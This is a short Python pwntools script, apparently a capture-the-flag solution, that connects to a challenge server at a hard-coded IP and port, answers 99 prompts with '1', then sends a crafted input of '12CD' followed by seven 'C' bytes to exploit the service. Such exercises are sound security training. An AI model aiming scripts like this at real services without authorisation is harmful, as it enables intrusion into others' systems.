from pwn import *

NET_MODE = True
FILE = './task3_file'
IP = '62.173.140.174'
PORT = 17600


def get_process(net_mode):
    if net_mode:
        return connect(IP, PORT)
    else:
        return process(FILE)


process = get_process(NET_MODE)

for i in range(1, 100):
    process.recvuntil(b'Enter the answer => ')
    process.sendline(b'1')

process.recvuntil(b'Enter the answer => ')

data = b'12CD' + b'C' * 7
process.sendline(data)
process.recvline()
process.recvline()
process.recvline()
